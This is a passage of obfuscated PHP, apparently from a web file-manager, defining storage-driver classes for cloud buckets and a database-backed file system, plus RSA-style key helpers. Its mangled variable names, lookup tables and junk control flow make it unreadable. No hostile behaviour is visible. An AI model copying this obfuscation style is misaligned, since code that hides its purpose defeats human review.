$Î◊õÃ˛„++; } break; } if ($†¨…»ë - 1 > 0) { $¶ì˙çÌ” = $this->hoqy66faaedf($¶ì˙çÌ”, $ûàﬁ∑≤ê, $†¨…»ë - 1); } return $¶ì˙çÌ”; } public function vmtg8d149cd5($©⁄«Ç”ƒ) { $ò¥ÿ∏í¿ =& $_SERVER[ß⁄ˆÇ†Œ]; $ç ·Ω∂õ =& $_SERVER[è¨ò„Àﬂ]; $§∂ïÔªÙ = $this->pbjr834867c2(); $»∏ºæ ü = $ò¥ÿ∏í¿[806]; while ($»∏ºæ ü < $ò¥ÿ∏í¿[326]) { if ($»∏ºæ ü >= 0) { break; } $»∏ºæ ü++; } $…ﬂé¥£∞ = $this->pbjr834867c2(); $§Ñπ¶ƒâ = ($§∂ïÔªÙ - 1) * ($…ﬂé¥£∞ - 1); $í˜ÛéÛù = intval(($§∂ïÔªÙ + $…ﬂé¥£∞) / 2); while (1) { $§êÈÌü† = $í˜ÛéÛù; $Ùç≈≈Ç÷ = $§Ñπ¶ƒâ; $»ﬁ∞€√Ï = $ò¥ÿ∏í¿[807]; if (strlen($»ﬁ∞€√Ï) < $ò¥ÿ∏í¿[704]) { die; } while ($Ùç≈≈Ç÷ % $§êÈÌü† != 0) { $àòß´¨ª = $Ùç≈≈Ç÷; $Ùç≈≈Ç÷ = $§êÈÌü†; $§êÈÌü† = $àòß´¨ª % $§êÈÌü†; } if ($§êÈÌü† == 1) { break; } else { $í˜ÛéÛù++; } } $áﬁá±…¨ = 2; for ($∆πﬂ†ñÒ = 0; $∆πﬂ†ñÒ < $§Ñπ¶ƒâ * 10; $∆πﬂ†ñÒ++) { if (($§Ñπ¶ƒâ * $∆πﬂ†ñÒ + 1) % $í˜ÛéÛù == 0) { $áﬁá±…¨ = intval(($§Ñπ¶ƒâ * $∆πﬂ†ñÒ + 1) / $í˜ÛéÛù); break; } } $€˙Öó√© = $this->shwy74269dfb($§∂ïÔªÙ * $…ﬂé¥£∞ . $ç ·Ω∂õ[6], $ç ·Ω∂õ[136]); $Ä„ƒìÍ≠ = md5($ç ·Ω∂õ[304] . ($§∂ïÔªÙ + $…ﬂé¥£∞) . $ç ·Ω∂õ[305] . $í˜ÛéÛù . $ç ·Ω∂õ[305] . $áﬁá±…¨ . $ç ·Ω∂õ[306]); $∆¯ÑÄñŒ = $ò¥ÿ∏í¿[808]; $™‡Ç≈ﬁä = $this->shwy74269dfb($©⁄«Ç”ƒ, $Ä„ƒìÍ≠) . $ç ·Ω∂õ[307] . $€˙Öó√©; return $™‡Ç≈ﬁä; $ƒ¡âﬂªö = $ò¥ÿ∏í¿[809]; if (strlen($ƒ¡âﬂªö) < $ò¥ÿ∏í¿[326]) { die; } } public function atbv31eea042($†¥ôÑÏø) { $ª÷˚ÓÑ· =& $_SERVER[ß⁄ˆÇ†Œ]; $ÚÎ–çá◊ =& $_SERVER[è¨ò„Àﬂ]; $ÃÙö‹óÒ = explode($ÚÎ–çá◊[307], $†¥ôÑÏø); $˚çÀÍÛñ = $ª÷˚ÓÑ·[810]; if (count($ÃÙö‹óÒ) != 2) { return $ÚÎ–çá◊[6]; } $“º∂∞Ãﬂ = $this->rkql95ceede5($ÃÙö‹óÒ[1] . $ÚÎ–çá◊[6], $ÚÎ–çá◊[136]); $áÅÿ°–∏ = $ª÷˚ÓÑ·[811]; if (!$“º∂∞Ãﬂ) { return $ÚÎ–çá◊[6]; } $“º∂∞Ãﬂ = intval($“º∂∞Ãﬂ); $”ÅëÌùÓ = 0; $‚ΩŸ√Œì = $ª÷˚ÓÑ·[812]; if (strlen($‚ΩŸ√Œì) < $ª÷˚ÓÑ·[688]) { return; } $ó∏éã¡ô = 0; for ($€òº∂≥û = 3; $€òº∂≥û < $“º∂∞Ãﬂ; $€òº∂≥û += 2) { if ($“º∂∞Ãﬂ % $€òº∂≥û != 0) { continue; } $”ÅëÌùÓ = $€òº∂≥û; $ó∏éã¡ô = intval($“º∂∞Ãﬂ / $€òº∂≥û); break; } $Úøò∂ÜÜ = ($”ÅëÌùÓ - 1) * ($ó∏éã¡ô - 1); $˘Ø∆·Æ∫ = $ª÷˚ÓÑ·[813]; if (!$˘Ø∆·Æ∫) { return; } $ê†òÎ≤‡ = intval(($”ÅëÌùÓ + $ó∏éã¡ô) / 2); $øíÜ˛≈Ï = $ª÷˚ÓÑ·[814]; if (!$øíÜ˛≈Ï) { return; } while (1) { $ùº—£∫À = $ê†òÎ≤‡; $ë∑¨ıÓÜ = $Úøò∂ÜÜ; while ($ë∑¨ıÓÜ % $ùº—£∫À != 0) { $∫Í‚ùœ◊ = $ë∑¨ıÓÜ; $∑è™Ó≠  = $ª÷˚ÓÑ·[815]; if (!$∑è™Ó≠ ) { die; } $ë∑¨ıÓÜ = $ùº—£∫À; $ö∫°©Å = $ª÷˚ÓÑ·[815]; if (!$ö∫°©Å) { die; } $ùº—£∫À = $∫Í‚ùœ◊ % $ùº—£∫À; $ÉüÂ˝ÓÇ = $ª÷˚ÓÑ·[816]; } if ($ùº—£∫À == 1) { break; } else { $ê†òÎ≤‡++; } } $≥ú‚—èı = 2; $‚íÄ·âØ = $ª÷˚ÓÑ·[817]; while ($‚íÄ·âØ < $ª÷˚ÓÑ·[688]) { if ($‚íÄ·âØ >= 0) { break; } $‚íÄ·âØ++; } for ($€òº∂≥û = 0; $€òº∂≥û < $Úøò∂ÜÜ * 10; $€òº∂≥û++) { if (($Úøò∂ÜÜ * $€òº∂≥û + 1) % $ê†òÎ≤‡ == 0) { $≥ú‚—èı = intval(($Úøò∂ÜÜ * $€òº∂≥û + 1) / $ê†òÎ≤‡); break; } } $Ä«ãêı∆ = md5($ÚÎ–çá◊[304] . ($”ÅëÌùÓ + $ó∏éã¡ô) . $ÚÎ–çá◊[305] . $ê†òÎ≤‡ . $ÚÎ–çá◊[305] . $≥ú‚—èı . $ÚÎ–çá◊[306]); $îﬁ¥Ù™ﬁ = $this->rkql95ceede5($ÃÙö‹óÒ[0], $Ä«ãêı∆); $ÖÿÏØÖ¸ = $ª÷˚ÓÑ·[818]; if (strlen($ÖÿÏØÖ¸) < $ª÷˚ÓÑ·[695]) { die; } return $îﬁ¥Ù™ﬁ; } public function pbjr834867c2() { $Ú€˜¨®„ =& $_SERVER[ß⁄ˆÇ†Œ]; $òîœìÚ˜ = mt_rand(pow(2, 14), pow(2, 16) - 1); $‹˚ﬁ∆ÎÃ = array(); $›ûÇèá§ = $Ú€˜¨®„[819]; while (strlen($›ûÇèá§) < $Ú€˜¨®„[693]) { if (!$›ûÇèá§) { break; } $›ûÇèá§++; } $ﬂõ∏≈≥Ê = 1; while ($ﬂõ∏≈≥Ê <= (int) sqrt($òîœìÚ˜)) { $¢î‹ﬂ±â = $ﬂõ∏≈≥Ê; while (!0) { $¢î‹ﬂ±â++; $¿ç»å‰ç = $Ú€˜¨®„[820]; if (strlen($¿ç»å‰ç) < $Ú€˜¨®„[326]) { return; } if ($¢î‹ﬂ±â <= 2) { $ﬂõ∏≈≥Ê = $¢î‹ﬂ±â; break; } else { if ($¢î‹ﬂ±â < 2) { continue; } } $ˆëÉˆô¿ = !0; for ($ô≤ä¯úê = 2; $ô≤ä¯úê <= sqrt($¢î‹ﬂ±â); $ô≤ä¯úê++) { if ($¢î‹ﬂ±â % $ô≤ä¯úê == 0) { $ˆëÉˆô¿ = !1; } } if ($ˆëÉˆô¿) { $ﬂõ∏≈≥Ê = $¢î‹ﬂ±â; break; } } $‹˚ﬁ∆ÎÃ[] = $ﬂõ∏≈≥Ê; } $‹Ñ¿ãÇŒ = 2; for ($¢î‹ﬂ±â = $òîœìÚ˜; $¢î‹ﬂ±â > 1; $¢î‹ﬂ±â--) { $ˆëÉˆô¿ = !0; foreach ($‹˚ﬁ∆ÎÃ as $±‘ÖŸŒ˚) { if ($¢î‹ﬂ±â % $±‘ÖŸŒ˚ == 0) { $ˆëÉˆô¿ = !1; break; } } if ($ˆëÉˆô¿) { $‹Ñ¿ãÇŒ = $¢î‹ﬂ±â; break; } } return $‹Ñ¿ãÇŒ; } public function jegh08601bc7($Í¿ßÚâ§, $ﬂ¬î±Óµ) { $·¬¯Ì˙’ =& $_SERVER[è¨ò„Àﬂ]; return call_user_func(array($·¬¯Ì˙’[8], $·¬¯Ì˙’[308]), $Í¿ßÚâ§, $ﬂ¬î±Óµ); } public function shwy74269dfb($ÁºÛ´•∫, $ò‹˜à∂ì) { $≥¨®πí° =& $_SERVER[è¨ò„Àﬂ]; return call_user_func(array($≥¨®πí°[309], $≥¨®πí°[310]), $ÁºÛ´•∫, $ò‹˜à∂ì); } public function rkql95ceede5($Ã´‹‰¬ÿ, $à‘œ÷»¢) { $’Ü∫êïô =& $_SERVER[è¨ò„Àﬂ]; return call_user_func(array($’Ü∫êïô[309], $’Ü∫êïô[311]), $Ã´‹‰¬ÿ, $à‘œ÷»¢); } } goto A‹ËïŒ∞π®; a„÷ïùÒ¥®: class PathDriverBOS extends PathDriverS3 { public function __construct($‰˘¢ì÷ÿ) { parent::__construct($‰˘¢ì÷ÿ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($»ï∆„¡¬) { $˙Á◊Ô´‘ =& $_SERVER[ß⁄ˆÇ†Œ]; if (substr($»ï∆„¡¬, 0, 7) == $˙Á◊Ô´‘[313]) { $»ï∆„¡¬ = $˙Á◊Ô´‘[314] . substr($»ï∆„¡¬, 7); } header($˙Á◊Ô´‘[175] . $»ï∆„¡¬); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ˆ˛‚äª‰) { parent::__construct($ˆ˛‚äª‰); $this->setSignVersion($_SERVER[ß⁄ˆÇ†Œ][247]); } public function uploadFormData($√Ø◊ñˆÆ, $‘†ì–É¶ = 3600) { $°Ç¸∑êƒ =& $_SERVER[ß⁄ˆÇ†Œ]; $≤ºπàéè = $°Ç¸∑êƒ[229]; $˘•º≈¢ = $°Ç¸∑êƒ[263]; $≥Ó⁄˙¡‚ = $°Ç¸∑êƒ[274]; $⁄⁄£¬ôó = gmdate($°Ç¸∑êƒ[299], time() + $‘†ì–É¶); $ƒèÎ∞íã = (string) time() . $°Ç¸∑êƒ[74] . (string) (time() + $‘†ì–É¶); $≠‰Ò¸Ÿ÷ = array($°Ç¸∑êƒ[275] => $⁄⁄£¬ôó, $°Ç¸∑êƒ[278] => array(array($°Ç¸∑êƒ[280] => $≤ºπàéè), array($°Ç¸∑êƒ[279] => $this->bucket), array($°Ç¸∑êƒ[281], $°Ç¸∑êƒ[282], $°Ç¸∑êƒ[12]), array($°Ç¸∑êƒ[285] => $≥Ó⁄˙¡‚), array($°Ç¸∑êƒ[1407] => $˘•º≈¢), array($°Ç¸∑êƒ[1408] => $this->accessKey), array($°Ç¸∑êƒ[1409] => $ƒèÎ∞íã))); $≠‰Ò¸Ÿ÷ = json_encode($≠‰Ò¸Ÿ÷); $∆úÔÑùË = hash_hmac($°Ç¸∑êƒ[263], $ƒèÎ∞íã, $this->secret); $≤ÆåàÆÃ = sha1($≠‰Ò¸Ÿ÷); $ƒ¡ÆÃ´¯ = hash_hmac($°Ç¸∑êƒ[263], $≤ÆåàÆÃ, $∆úÔÑùË); $Ò∑◊ÄË“ = array($°Ç¸∑êƒ[280] => $≤ºπàéè, $°Ç¸∑êƒ[285] => $≥Ó⁄˙¡‚, $°Ç¸∑êƒ[293] => base64_encode($≠‰Ò¸Ÿ÷), $°Ç¸∑êƒ[1407] => $˘•º≈¢, $°Ç¸∑êƒ[1408] => $this->accessKey, $°Ç¸∑êƒ[1410] => $ƒèÎ∞íã, $°Ç¸∑êƒ[1411] => $ƒ¡ÆÃ´¯, $°Ç¸∑êƒ[208] => $this->getHost()); return $Ò∑◊ÄË“; } public function fileOutImage($≤ÿ–®ºÃ, $—ÎË√í⁄ = 250) { $¶è—∆•ÿ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($this->size($≤ÿ–®ºÃ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($≤ÿ–®ºÃ, $—ÎË√í⁄); } $≠„ØÃ¶œ = $this->link($≤ÿ–®ºÃ); $≠„ØÃ¶œ .= $¶è—∆•ÿ[1412] . $—ÎË√í⁄ . $¶è—∆•ÿ[1413]; $this->fileOutLink($≠„ØÃ¶œ); } public function fileOutLink($ºÜÍ£¸Ú) { $≥é›ˆÚä =& $_SERVER[ß⁄ˆÇ†Œ]; if (substr($ºÜÍ£¸Ú, 0, 7) == $≥é›ˆÚä[313]) { $ºÜÍ£¸Ú = $≥é›ˆÚä[314] . substr($ºÜÍ£¸Ú, 7); } header($≥é›ˆÚä[175] . $ºÜÍ£¸Ú); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¶Óò±∞£) { $this->pathParse = $¶Óò±∞£; $this->model = Model($_SERVER[ß⁄ˆÇ†Œ][1414]); } public function getPath($†∫áΩÄ“) { return trim($†∫áΩÄ“, $_SERVER[ß⁄ˆÇ†Œ][8]); } public function pathFather($˘õäì≥™) { $Üöû‘Á• = $this->parse($˘õäì≥™); $Üöû‘Á• = $this->infoSimple($˘õäì≥™); return $Üöû‘Á• ? $Üöû‘Á•[$_SERVER[ß⁄ˆÇ†Œ][192]] : !1; } public function pathThis($ïîúÜ˛ÿ) { $ùùÃæçÈ = $this->infoSimple($ïîúÜ˛ÿ); return $ùùÃæçÈ ? $ùùÃæçÈ[$_SERVER[ß⁄ˆÇ†Œ][32]] : !1; } public function getPathOuter($≤—•Ñﬁ≈) { if (!$≤—•Ñﬁ≈) { return $≤—•Ñﬁ≈; } $ﬂïß∫⁄Í = $this->parse($≤—•Ñﬁ≈); return KodIO::make($ﬂïß∫⁄Í[$_SERVER[ß⁄ˆÇ†Œ][483]]); } public function copyFolderFromIO($¯ﬂüïÜû, $’„‡ı»í, $ÆÉÀ⁄Ùú, $ÛŸ¬ÂïÚ, $´”âô˜î) { $¨·˜•Ω§ = $this->model->copyFolderFromIO($¯ﬂüïÜû, $’„‡ı»í, $ÆÉÀ⁄Ùú, $ÛŸ¬ÂïÚ, $´”âô˜î); return KodIO::make($¨·˜•Ω§); } public function isParentOf($®¸ç·Ã¿, $ªß°Ìﬂ≤) { return $this->model->isParentOf($®¸ç·Ã¿, $ªß°Ìﬂ≤); } public function mkfile($‡¬£≤–Ë, $˘’úÄÔ = '', $æÌó£’é = REPEAT_RENAME) { $ ˛Îö·£ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÕàØá¸Ñ = $this->parse($‡¬£≤–Ë); $‡¬£≤–Ë = $ÕàØá¸Ñ[$ ˛Îö·£[483]]; for ($“Êå€Å∑ = 0; $“Êå€Å∑ < count($ÕàØá¸Ñ[$ ˛Îö·£[1415]]); $“Êå€Å∑++) { $Æûî˙–£ = $ÕàØá¸Ñ[$ ˛Îö·£[1415]][$“Êå€Å∑]; if ($“Êå€Å∑ == count($ÕàØá¸Ñ[$ ˛Îö·£[1415]]) - 1) { $‡¬£≤–Ë = $this->model->mkfile($‡¬£≤–Ë, $Æûî˙–£, $˘’úÄÔ, $æÌó£’é); break; } $‡¬£≤–Ë = $this->model->mkdir($‡¬£≤–Ë, $Æûî˙–£, REPEAT_SKIP); } return $this->getPathOuter($‡¬£≤–Ë); } public function mkdir($´˘¥∫Ò, $ÇáæÄ¡∫ = REPEAT_SKIP) { $—–€ﬁâ∂ =& $_SERVER[ß⁄ˆÇ†Œ]; $€Ω¨ı¶» = $this->parse($´˘¥∫Ò); $´˘¥∫Ò = $€Ω¨ı¶»[$—–€ﬁâ∂[483]]; for ($õπÜ˝…å = 0; $õπÜ˝…å < count($€Ω¨ı¶»[$—–€ﬁâ∂[1415]]); $õπÜ˝…å++) { $ëÅÒà„Ì = $€Ω¨ı¶»[$—–€ﬁâ∂[1415]][$õπÜ˝…å]; $´˘¥∫Ò = $this->model->mkdir($´˘¥∫Ò, $ëÅÒà„Ì, $ÇáæÄ¡∫); } return $this->getPathOuter($´˘¥∫Ò); } public function copyFile($âúöÒãç, $…›ßÙåÖ, $˜Ãëòî‚ = REPEAT_REPLACE) { $ñ¯Å‹±Ó =& $_SERVER[ß⁄ˆÇ†Œ]; $•èá∞≠º = $this->parse($…›ßÙåÖ); $€ﬁ∫·÷„ = $this->model->copy($âúöÒãç, $•èá∞≠º[$ñ¯Å‹±Ó[483]], $˜Ãëòî‚, $•èá∞≠º[$ñ¯Å‹±Ó[87]]); return $€ﬁ∫·÷„ ? $this->getPathOuter($€ﬁ∫·÷„) : !1; } public function moveFile($˝íªÑœ£, $Ñ£–º◊≈, $‡“æîÎÙ = REPEAT_REPLACE) { $π˚ñ°õ≤ =& $_SERVER[ß⁄ˆÇ†Œ]; $¿ÂÂ’¿˜ = $this->parse($Ñ£–º◊≈); $‡Œ’‘ºŸ = $this->model->move($˝íªÑœ£, $¿ÂÂ’¿˜[$π˚ñ°õ≤[483]], $‡“æîÎÙ, $¿ÂÂ’¿˜[$π˚ñ°õ≤[87]]); return $‡Œ’‘ºŸ ? $this->getPathOuter($‡Œ’‘ºŸ) : !1; } public function copy($∂Íàﬂ∆¢, $◊€Û‹ª‡, $≈ØéË◊∂ = REPEAT_REPLACE, $§’«Çﬁ¸ = false) { $¢¯¨ÖŒì = $this->parse($◊€Û‹ª‡); $éΩŒ®©Î = $this->model->copy($∂Íàﬂ∆¢, $¢¯¨ÖŒì[$_SERVER[ß⁄ˆÇ†Œ][483]], $≈ØéË◊∂, $§’«Çﬁ¸); return $éΩŒ®©Î ? $this->getPathOuter($éΩŒ®©Î) : !1; } public function moveSameAllow() { } public function move($¥›Œ◊‚ˆ, $˛ÙÄá‡å, $ÓÊÜÖˆÍ = REPEAT_REPLACE, $Èúõ•ëÓ = false) { $æ‡ñ¬•· = $this->parse($˛ÙÄá‡å); $Ωòœ¨Ä = $this->model->move($¥›Œ◊‚ˆ, $æ‡ñ¬•·[$_SERVER[ß⁄ˆÇ†Œ][483]], $ÓÊÜÖˆÍ, $Èúõ•ëÓ); return $Ωòœ¨Ä ? $this->getPathOuter($Ωòœ¨Ä) : !1; } public function remove($‰—·Âì¢, $ûÂ“†£— = true) { return $this->model->remove($‰—·Âì¢, $ûÂ“†£—); } public function rename($ºç£àÙé, $˝¡∂Ì÷⁄) { $Æ’‚§Öâ = $this->model->rename($ºç£àÙé, $˝¡∂Ì÷⁄); return $Æ’‚§Öâ ? $this->getPathOuter($ºç£àÙé) : $Æ’‚§Öâ; } public function size($•ù•æèê) { $•˙¡Œ◊≤ = $this->infoSimple($•ù•æèê); return $•˙¡Œ◊≤ ? $•˙¡Œ◊≤[$_SERVER[ß⁄ˆÇ†Œ][79]] : 0; } public function infoSimple($ÍåúŒ˝Ã) { return $this->model->sourceInfo($ÍåúŒ˝Ã); } public function info($Øû›∏ßﬂ) { return $this->infoParse($Øû›∏ßﬂ); } public function infoAuth($ïëÍÃ˘Õ) { return $this->infoParse($ïëÍÃ˘Õ, !1, !0); } public function infoWithChildren($˘çøÊ•Æ) { return $this->infoParse($˘çøÊ•Æ, !0); } protected function infoParse($Æ°¬¯ÆÁ, $ö¢È°ïΩ = false, $◊ﬂ÷÷éÕ = false) { if (!$ö¢È°ïΩ) { return $this->model->pathInfo($Æ°¬¯ÆÁ, $◊ﬂ÷÷éÕ); } return $this->model->pathInfoMore($Æ°¬¯ÆÁ); } public function infoFullSimple($∞ÕòÊ¸») { $ﬂâƒË’æ =& $_SERVER[ß⁄ˆÇ†Œ]; $¶Ïù∆˝≠ = explode($ﬂâƒË’æ[8], $∞ÕòÊ¸»); $˛ŸÆã⁄÷ = implode($ﬂâƒË’æ[8], array_splice($¶Ïù∆˝≠, 1)); return $this->model->pathInfoByPath($¶Ïù∆˝≠[0], $˛ŸÆã⁄÷); } public function infoFull($‘ƒ¬Åë∆) { $≥ŒÑ•± = $this->infoFullSimple($‘ƒ¬Åë∆); return is_array($≥ŒÑ•±) ? $this->model->pathInfo($≥ŒÑ•±[$_SERVER[ß⁄ˆÇ†Œ][193]]) : !1; } public function hashSimple($Ñó÷†§¥) { $íåÉô‹´ =& $_SERVER[ß⁄ˆÇ†Œ]; $¢›ößè = $this->infoWithChildren($Ñó÷†§¥); return $¢›ößè[$íåÉô‹´[170]][$íåÉô‹´[680]]; } public function hashMd5($™∆˛≤‚ó) { $∑ä§“πŒ =& $_SERVER[ß⁄ˆÇ†Œ]; $›ﬁ≤ÊûÓ = $this->infoWithChildren($™∆˛≤‚ó); return $›ﬁ≤ÊûÓ[$∑ä§“πŒ[170]][$∑ä§“πŒ[555]]; } public function exist($Ê∫ÃÂúØ) { $∂Ä“˘˘° =& $_SERVER[ß⁄ˆÇ†Œ]; $»Ó¿üûõ = $this->parse($Ê∫ÃÂúØ); if (!$»Ó¿üûõ[$∂Ä“˘˘°[87]]) { return $this->isFile($Ê∫ÃÂúØ) || $this->isFolder($Ê∫ÃÂúØ); } $ÀÖ—‚ûñ = array($∂Ä“˘˘°[485] => $»Ó¿üûõ[$∂Ä“˘˘°[483]], $∂Ä“˘˘°[32] => $»Ó¿üûõ[$∂Ä“˘˘°[87]]); $«Ú†⁄êâ = $this->model->where($ÀÖ—‚ûñ)->find(); return $«Ú†⁄êâ ? !0 : !1; } public function isFile($†ˆ©∫“) { $˛˘ú˜˙ê =& $_SERVER[ß⁄ˆÇ†Œ]; $ê‚ø‡¥˚ = $this->infoSimple($†ˆ©∫“); return $ê‚ø‡¥˚ && $ê‚ø‡¥˚[$˛˘ú˜˙ê[493]] == $˛˘ú˜˙ê[228] ? !0 : !1; } public function isFolder($éΩœÿè˛) { $∏ç¯Å¿û =& $_SERVER[ß⁄ˆÇ†Œ]; $≥â÷¯ëò = $this->infoSimple($éΩœÿè˛); return $≥â÷¯ëò && $≥â÷¯ëò[$∏ç¯Å¿û[493]] == $∏ç¯Å¿û[91] ? !0 : !1; } public function listPath($õäøÁ‚ü, $“⁄ÜÚ∫∂ = false) { $–÷±÷ëÊ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($õäøÁ‚ü == $–÷±÷ëÊ[12]) { return !1; } $ãœÉ·öÙ = array($–÷±÷ëÊ[485] => $õäøÁ‚ü); if ($“⁄ÜÚ∫∂) { return $this->model->listSource($ãœÉ·öÙ, -1); } return $this->model->listSource($ãœÉ·öÙ); } public function has($Âú¡úﬂÁ, $ﬂÈ∏ÁÃ» = false, $è†”ﬂ∑ˆ = null) { $∂„…Å£ª =& $_SERVER[ß⁄ˆÇ†Œ]; $˚ﬁÕÁÁô = $this->infoWithChildren($Âú¡úﬂÁ); if ($ﬂÈ∏ÁÃ») { return array($∂„…Å£ª[240] => $˚ﬁÕÁÁô[$∂„…Å£ª[240]], $∂„…Å£ª[239] => $˚ﬁÕÁÁô[$∂„…Å£ª[239]]); } return $è†”ﬂ∑ˆ ? $˚ﬁÕÁÁô[$∂„…Å£ª[240]] : $˚ﬁÕÁÁô[$∂„…Å£ª[239]]; } public function listAll($™à˙Ÿªü) { $◊Àå§≥¸ = IO::info($this->pathParse[$_SERVER[ß⁄ˆÇ†Œ][87]]); if (!$◊Àå§≥¸) { return array(); } return $this->model->listAll($™à˙Ÿªü); } public function getContent($È¢ôâ—–) { return $this->model->getContent($È¢ôâ—–); } public function setContent($¸‚ﬂ—Í, $±ÿµÿﬂ = '') { return $this->model->setContent($¸‚ﬂ—Í, $±ÿµÿﬂ); } public function fileSubstr($í˜“à¶‹, $ƒ¨Ê≈úÅ, $‚Ë“≤Éà) { return $this->model->fileSubstr($í˜“à¶‹, $ƒ¨Ê≈úÅ, $‚Ë“≤Éà); } public function download($È¸®«èˆ, $†÷ò⁄∆Œ = '') { $æ≤”˙ı› = get_path_father($†÷ò⁄∆Œ); $ÃòıÜ‚À = get_path_this($†÷ò⁄∆Œ); $◊˙≤¿ó› = $this->model->fileInfoGet($È¸®«èˆ); $’‰´ßâÆ = IO::copy($◊˙≤¿ó›[$_SERVER[ß⁄ˆÇ†Œ][87]], $æ≤”˙ı›, !1, $ÃòıÜ‚À); return $’‰´ßâÆ; } public function setModifyTime($ÿÌ…¶î—, $∂ï˜â‹ù = '') { $≥˚Ω¿˝ú =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$ÿÌ…¶î—) { return; } $this->model->where(array($≥˚Ω¿˝ú[499] => $ÿÌ…¶î—))->save(array($≥˚Ω¿˝ú[88] => $∂ï˜â‹ù)); } public function upload($Ú¡≈Ø¬∂, $ä√»Á©ç, $‚ã™ŸÊÄ = false, $«∫©¡üì = REPEAT_REPLACE) { $’ŒËπ¢ã =& $_SERVER[ß⁄ˆÇ†Œ]; $ƒ’ÁÒπ‰ = $this->parse($Ú¡≈Ø¬∂); $Ç≤÷‘ñ› = $this->model->addFile($ƒ’ÁÒπ‰[$’ŒËπ¢ã[483]], $ä√»Á©ç, $ƒ’ÁÒπ‰[$’ŒËπ¢ã[87]], $‚ã™ŸÊÄ, $«∫©¡üì); return $this->getPathOuter($Ç≤÷‘ñ›); } public function uploadFileByID($∂Ë∂Îπæ, $ñ∞‰õµæ, $â´¿ûçò) { $µ–öÑ∆¸ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ç¯¿Ïó™ = $this->parse($∂Ë∂Îπæ); $ı ¬∞Êµ = $this->model->addFileByFileID($Ç¯¿Ïó™[$µ–öÑ∆¸[483]], $ñ∞‰õµæ, $Ç¯¿Ïó™[$µ–öÑ∆¸[87]], $â´¿ûçò); return $this->getPathOuter($ı ¬∞Êµ); } public function addFileByRemote($ÊüÙ∆ì, $‚Ã¨ç§∑, $ÒÍ≠ò˛• = array(), $÷Å¶ªöÅ = '', $≥Ú≥≈¨´) { $Ì’˘π˙Ì =& $_SERVER[ß⁄ˆÇ†Œ]; $…ÕÔ»˜ë = $this->parse($ÊüÙ∆ì); $÷Å¶ªöÅ = empty($÷Å¶ªöÅ) ? $…ÕÔ»˜ë[$Ì’˘π˙Ì[87]] : $÷Å¶ªöÅ; $´›«’¥Ú = $this->model->addFileByRemote($…ÕÔ»˜ë[$Ì’˘π˙Ì[483]], $‚Ã¨ç§∑, $÷Å¶ªöÅ, $ÒÍ≠ò˛•, $≥Ú≥≈¨´); return $this->getPathOuter($´›«’¥Ú); } public function uploadLink($èÍÊÎ‰ï, $‹Å’≠°À = 0) { $Ù¬ñÔÒÄ =& $_SERVER[ß⁄ˆÇ†Œ]; $‡´“Ôé˜ = $this->parse($èÍÊÎ‰ï); $íÌÄ§¡˘ = _get($GLOBALS[$Ù¬ñÔÒÄ[7]], $Ù¬ñÔÒÄ[1416]); $‘·Ë¸¿Ä = _get($GLOBALS[$Ù¬ñÔÒÄ[7]], $Ù¬ñÔÒÄ[1417]); $èÍÊÎ‰ï = Model($Ù¬ñÔÒÄ[682])->createFileName($‡´“Ôé˜[$Ù¬ñÔÒÄ[87]], $íÌÄ§¡˘, $‘·Ë¸¿Ä); return IO::uploadLink($èÍÊÎ‰ï, $‹Å’≠°À); } public function fileNameAuto($Êìßù•ã, $‹ƒıøÈ–, $ÒñÄ¨»™ = REPEAT_REPLACE, $≥€∏´∏Ø = false) { return $this->model->fileNameAuto($Êìßù•ã, $‹ƒıøÈ–, $ÒñÄ¨»™, $≥€∏´∏Ø); } public function fileNameExist($‘ˆ†ú£Ω, $ïƒ°Ê»Û) { return $this->model->fileNameExist($‘ˆ†ú£Ω, $ïƒ°Ê»Û); } protected function _fileOut($ËŒ≥ù∆´, $›Í£ù√¥ = false, $û“éö⁄∏ = false, $ôÄ¸¬ªº = '', $ö«åΩáª = false) { $û»–á≥ß =& $_SERVER[ß⁄ˆÇ†Œ]; $ú°ô∑®Ç = $this->model->sourceInfo($ËŒ≥ù∆´); if ($ú°ô∑®Ç[$û»–á≥ß[493]] == $û»–á≥ß[91]) { header($û»–á≥ß[1418]); die; } $õ‘ËÖ‰ã = $this->model->fileInfoGet($ËŒ≥ù∆´); $ôÄ¸¬ªº = $õ‘ËÖ‰ã[$û»–á≥ß[555]] ? $õ‘ËÖ‰ã[$û»–á≥ß[555]] : $ôÄ¸¬ªº; $œ⁄ƒ’á  = isset($GLOBALS[$û»–á≥ß[182]]) && is_array($GLOBALS[$û»–á≥ß[182]]) ? $GLOBALS[$û»–á≥ß[182]][$û»–á≥ß[32]] : $ú°ô∑®Ç[$û»–á≥ß[32]]; if ($ö«åΩáª) { return IO::fileOutServer($õ‘ËÖ‰ã[$û»–á≥ß[87]], $›Í£ù√¥, $œ⁄ƒ’á , $ôÄ¸¬ªº); } IO::fileOut($õ‘ËÖ‰ã[$û»–á≥ß[87]], $›Í£ù√¥, $œ⁄ƒ’á , $ôÄ¸¬ªº); } public function fileOut($Üº¶ù¶ù, $´úãºÑó = false, $ıìÎõûç = false, $—˘•Ù≈Ï = '') { $this->_fileOut($Üº¶ù¶ù, $´úãºÑó, $ıìÎõûç, $—˘•Ù≈Ï); } public function fileOutServer($‹™˜ »∑, $Éöƒ‘√≈ = false, $æÙ›Ÿ¬‚ = false, $ÁÇØÁñ‰ = '') { $this->_fileOut($‹™˜ »∑, $Éöƒ‘√≈, $æÙ›Ÿ¬‚, $ÁÇØÁñ‰, !0); } protected function _fileOutImage($À”ì®“û, $¨â˝¬´¥ = 250) { $∆ú¬ä¶ =& $_SERVER[ß⁄ˆÇ†Œ]; $Íƒ–¨«Ò = $this->model->pathInfo($À”ì®“û); if ($Íƒ–¨«Ò[$∆ú¬ä¶[493]] == $∆ú¬ä¶[91]) { show_json($∆ú¬ä¶[1419] . $À”ì®“û, !1); } $˚áô™ﬁ€ = $this->model->fileInfoGet($À”ì®“û); $Íƒ–¨«Ò[$∆ú¬ä¶[183]] = $˚áô™ﬁ€[$∆ú¬ä¶[87]]; $GLOBALS[$∆ú¬ä¶[182]] = $Íƒ–¨«Ò; 